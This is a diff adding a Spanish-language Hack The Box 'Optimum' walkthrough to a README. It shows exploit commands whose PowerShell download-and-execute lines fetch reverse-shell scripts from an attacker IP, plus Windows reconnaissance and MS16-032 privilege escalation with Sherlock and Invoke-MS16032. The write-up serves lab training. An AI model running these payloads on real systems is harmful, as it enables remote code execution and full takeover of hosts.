@@ -38,14 +38,77 @@ Esto porque las rutas de Windows son:
 
 ![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/655ec89c-e633-411a-a5b0-3e0b670bd5ce)
 
+Ejecutando el exploit 
+
+```
+64 bits
+python 49125.py 10.129.8.234 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80/Invoke-PowerShellTcp.ps1')"
+32bits
+python 49125.py 10.129.8.234 80 "c:\windows\System32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80/Invoke-PowerShellTcp.ps1')"
+```
+
+![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/abf869fd-3dbe-4720-9e65-5fe563af9349)
 
 
+Para saber desde powershell la arquitectura
+
+```
+[Environment]::Is64BitProcess
+```
+
+## PrivEsc
+
+Ahora para escalar vamos a hacer reconocimiento basico..
+
+```
+systeminfo
+net user
+net localgroup
+netstat -ano
+```
+
+Ahora bajamos el Winpeas.exe y ejecutamos aunque como es una maquina vieja probamos con los exploits para esto tenemos varias alternativas...
+
+### Watson 
+
+Es una herramienta para sugerencia de exploits ya descontinuada como por el 2021 aun jala para que funcione el minimo que necesita es el NET Framework 4.5.
+
+> https://github.com/rasta-mouse/Watson
+
+Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.
 
 
+### Sherlock
+
+Esta es el predesesor de Watson y es un script en powershell ya sabes esta descontinuado casi a la par del Watson
+
+```
+Import-Module Sherlock.ps1
+Y ya despues que buesque
+Find-AllVulns
+```
+> https://github.com/rasta-mouse/Sherlock
+
+![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/bcbf5fdf-460a-4ae5-a42d-cf5a02447281)
+
+Encontramos que tiene una vulnerabildiad a MS16-032 la primera version genera una shell pero ni lanzandola con nc pude hacerla jalar por lo tanto use la version modificada por el equipo de empire
+
+> https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
 
 
+Hasta abajo puse para que se auto llame el proceso seria el siguiente
+
+```
+powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.80/Invoke-MS16032.ps1')
+La linea que se le agrego es
+Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.80/rev1.ps1')"
+
+```
+
+Asi que primero carga en la memoria todo y ya despues lo ejecuta. Lo anterior regresa un shell con todos lo privilegios....
 
 
+![image](https://github.com/gecr07/Optimum-HTB/assets/63270579/bef40c66-44dc-4b97-b0b4-8aa3a696f26e)
 
 
 
